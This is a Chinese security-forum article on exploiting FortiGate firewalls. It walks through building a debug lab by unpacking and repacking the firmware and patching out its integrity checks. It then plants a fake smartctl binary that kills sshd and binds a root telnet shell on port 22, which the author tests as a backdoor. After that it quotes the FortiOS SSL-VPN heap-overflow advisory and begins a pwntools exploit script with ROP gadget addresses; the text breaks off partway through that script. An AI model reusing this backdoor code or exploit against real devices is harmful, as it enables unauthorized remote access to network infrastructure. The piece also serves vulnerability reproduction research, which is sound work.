---
title: 飞塔防火墙漏洞层次深度利用
url: https://forum.butian.net/share/4428
source: 奇安信攻防社区
date: 2025-07-08
fetch_date: 2025-10-06T23:17:50.988296
---

# 飞塔防火墙漏洞层次深度利用

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 飞塔防火墙漏洞层次深度利用

* [漏洞分析](https://forum.butian.net/topic/48)

包括飞塔防火墙的完整调试搭建环境，以及对任意飞塔防火墙可以执行程序流后，写了多种利用方式，包括已经存在busybox的模拟环境进行远程开ssh连接，不存在busybox 用tftp拉取busybox但是没权限用nodejs渲染解决的流程，和不同获取busybox的方式 可以用tftp去攻击机拉取，nodejs拉取并且赋权，也可以js模拟wget请求，nodejs拉取并且赋权，很好的解决了飞塔防火墙本身自带shell被阉割的问题

环境搭建
----
通过官方下载附件，导入forigate-vm
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528101509468.png "null")
### 飞塔激活
可以参考下面师傅给出的脚本进行激活
[rrrrrrri/fgt-gadgets: Fortigate related tools](https://github.com/rrrrrrri/fgt-gadgets)
### 网卡ip配置：
然后设置第一个网卡为Nat模式
```php
config system interface
edit port1
set mode static
set ip 192.168.111.98 255.255.255.0
set allowaccess http https ping ssh telnet
end
```
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528101518485.png "null")
### 配置网卡
```php
config router static
edit 1
set device port1
set gateway 192.168.111.2
end
```
配置好之后就可以访问了
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102001145.png "null")
### \*\*配置 sslvpn\*\*
我们需要开启sslvpn的功能，需要对防火墙进行以下配置
SSLVPN\\_address subnet\\_addres ubuntu22
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102009938.png "null")
再创建一个新的用户
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102625865.png "null")
修改 vpn 门户，并进入 full-access 修改界面 VPN —–&gt; SSL-VPN-Portals—-&gt; full-access
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102014735.png "null")
进入vpn中修改设置如下：
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102018219.png "null")
接着修改防火墙配置策略
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102028170.png "null")
然后就可以访问4433端口
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102036907.png "null")
### 调试环境搭建 gdbserver+gdb
#### \*\*提取固件\*\*
1、安装libguestfs
libguestfs 是一组 Linux 下的 C 语言的 API ，用来访问虚拟机的磁盘映像文件，几乎可访问任意类型的文件系统。
```php
sudo apt install libguestfs-tools
```
2、查看磁盘分区情况
```php
sudo virt-filesystems -a fortigate7.2.2-disk1
```
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102044418.png "null")
3、挂载
```php
sudo guestmount -a fortigate\_7.2.2-disk1.vmdk -m /dev/sda1 --ro fortios\_mount
```
这里踩雷了 不建议用这种方式挂载 建议在vmware上进行挂载 用上面这种方式可能导致你覆盖文件的时候覆盖的是缓存
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102047601.png "null")
4、挂载成功后，rootfs.gz为文件系统压缩包，我们将其复制出来
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102054821.png "null")
复制出来后赋权解压
```php
sudo cp roofts.gz ../fritios
cd ..
chmod 777 rootfs.gz
gzip -d rootfs.gz
sudo cpio -idmv &lt; ./rootfs
sudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
sudo chroot . /sbin/ftar -xf /bin.tar
```
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102057446.png "null")
#### gdb
准备一个busybox 提供完成的sh指令，fgt自带的sh缺少很多指令
这里容易编译失败 建议多换几个版本试试
配置busybox
```php
wget https://git.busybox.net/busybox/snapshot/busybox-1\_36\_1.tar.bz2
tar -xjvf busybox-1\_36\_1.tar.bz2
sudo apt-get install libncurses5-dev
make menuconfig
make -j6
```
开始编译遇到的报错是这样
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102109322.png "null")
查了下是tc这部分的问题 但奇怪的是我有导入头文件 于是我就把这部分用make menuconfig中去掉了 Networking Utilities 中tc 然后在编译
```php
sudo cp ../busybox ./bin
sudo chmod +x ./bin/busybox
cd bin
sudo rm -rf sh
ln -s /bin/busybox sh
mv sh ./bin/sh
```
配置gdbserver
```php
sudo cp ../gdbserver-7.10.1-x64 ./bin
sudo chmod +x ./bin/gdbserver-7.10.1-x64
```
在命令行中执行 `diagnose hardware smartctl` 系统会执行 /bin/smartctl 程序；
可以自己重新写个smartctl放进去、复用22端口为sh
```php
#include
void shell(){
system("/bin/busybox ls",0,0); //执行ls
system("/bin/busybox id",0,0); //执行id
system("/bin/busybox kill all sshd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22",0,0); //停止所有sshd进程，telnet挂载sh到22端口、此时sh是指busybox
return;
}
int main(int argc, char const \*argv[]){
shell();
return 0;
}
```
gcc编译后 放入bin中
```php
gcc smartctl.c -static -o smartctl
sudo cp ../smartctl ./bin
sudo chmod +x ./bin/smartctl
```
反编译内核文件flatkc
```php
void \_\_fastcall \_\_noreturn init\_post\_isra\_0(\_\_int64 a1, void \*\*a2)
{
char v2; // al
\_\_int64 v3; // rax
int v4; // edx
int v5; // ecx
int v6; // r8d
int v7; // r9d
char v8; // [rsp-8h] [rbp-8h]
v8 = v2;
async\_synchronize\_full(a1, a2);
free\_initmem();
dword\_FFFFFFFF80A19880 = 1;
numa\_default\_policy();
v3 = \*(\_QWORD \*)(\_\_readgsqword(0xB700u) + 1048);
\*(\_DWORD \*)(v3 + 92) |= 0x40u;
if ( !(unsigned int)fgt\_verify() )//校验函数
{
off\_FFFFFFFF809B82C0 = "/sbin/init";
a2 = &amp;off\_FFFFFFFF809B82C0;
kernel\_execve("/sbin/init", &amp;off\_FFFFFFFF809B82C0, off\_FFFFFFFF809B81A0);
}
panic(
(unsigned int)"No init found. Try passing init= option to kernel. See Linux Documentation/init.txt for guidance.",
(\_DWORD)a2,
v4,
v5,
v6,
v7,
v8);
}
```
在代码中我们可以看到启动的是init文件 因此我们可以patch init文件
我们把/bin/init的文件这部分patch 只要涉及到do\\_halt函数 call的全部patch掉
所有这些做完后 就可以重打包了
```php
#压缩/bin文件
sudo chroot . /sbin/ftar -cf bin.tar bin
sudo chroot . /sbin/xz --check=sha256 -e bin.tar
#这里记得把/bin文件移出当前目录
sudo find ./ | cpio -H newc -o &gt; ../rootfs.raw
cd ../
sudo cat ./rootfs.raw | gzip &gt; rootfs.gz
# 进入硬盘目录
sudo rm ./rootfs.gz
sudo cp ~/Desktop/rootfs.gz ./
```
然后提权 把roofts.gz覆盖原来的就可以了
接下来 我们把flatkc 提取出来 这是内核文件 我们把内核转化为二进制文件 进行分析 和 调试
```php
sudo apt install python3-pip liblzo2-dev
sudo pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df
sudo pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf
```
踩的坑 我开始安装的时候 出现了这个报错
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102114799.png "null")
我的解决办法是 手动安装
你可以手动克隆 `python-lzo` 库到本地，然后再进行安装：
```php
bashgit clone https://github.com/clubby789/python-lzo
cd python-lzo
git checkout b4e39df
sudo pip3 install .
```
然后在执行后面的就没问题了
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102118246.png "null")
然后就可以启动飞塔进行调试了 启动后 飞塔如果一直在重启状态就说明我们覆盖成功了 这是因为飞塔一直过不了身份验证
也就是这个位置
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102125039.png "null")
我们就直接断点到这个位置：
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102134669.png "null")
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102140403.png "null")
发现断的不是我们的断点 这里的原因暂不清楚 但是解决办法就是，无论如何别按那个绿色箭头，你只需要理解 你一直c 它是会一直重启的 它重启就会反复执行start\\_kernel这个流程，那么 你可以尝试先往最开始的点 断 然后一点一点的接近你要断的点
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102152890.png "null")
先断在这里 再断在我们开始要断的位置就可以了
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102157137.png "null")
过了这里 ni 然后 set $rax=0 再c就可以进去了
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102200155.png "null")
然后测试一下后门
![](https://gitee.com/mu-xuecen/pic/raw/master/20250528102205766.png "null")
成功拿到shell
漏洞深度利用
------
A heap-based buffer overflow vulnerability \[CWE-122\] in FortiOS SSL-VPN 7.2.0 through 7.2.2, 7.0.0 through 7.0.8, 6.4.0 through 6.4.10, 6.2.0 through 6.2.11, 6.0.15 and earlier and FortiProxy SSL-VPN 7.2.0 through 7.2.1, 7.0.7 and earlier may allow a remote unauthenticated attacker to execute arbitrary code or commands via specifically crafted requests.
在 FortiOS SSL-VPN 7.2.0 至 7.2.2、7.0.0 至 7.0.8、6.4.0 至 6.4.10、6.2.0 至 6.2.11、6.0.15 及更早版本，以及 FortiProxy SSL-VPN 7.2.0 至 7.2.1、7.0.7 及更早版本中，存在一个基于堆的缓冲区溢出漏洞 \[CWE-122\]。该漏洞可能允许远程未经身份验证的攻击者通过特制的请求执行任意代码或命令。
### 带sh环境下的攻击
```php
import socket
import ssl
from pwn import \*
import random
import os
import sys
import time
from pwn import \*
from ctypes import \*
path = "/remote/login".encode()
content\_length = ["115964116992"]
ip = "192.168.111.148"
#1376
#0x000000000257008a push rdx.pop rdi.ret
#0x00000000017ec3b...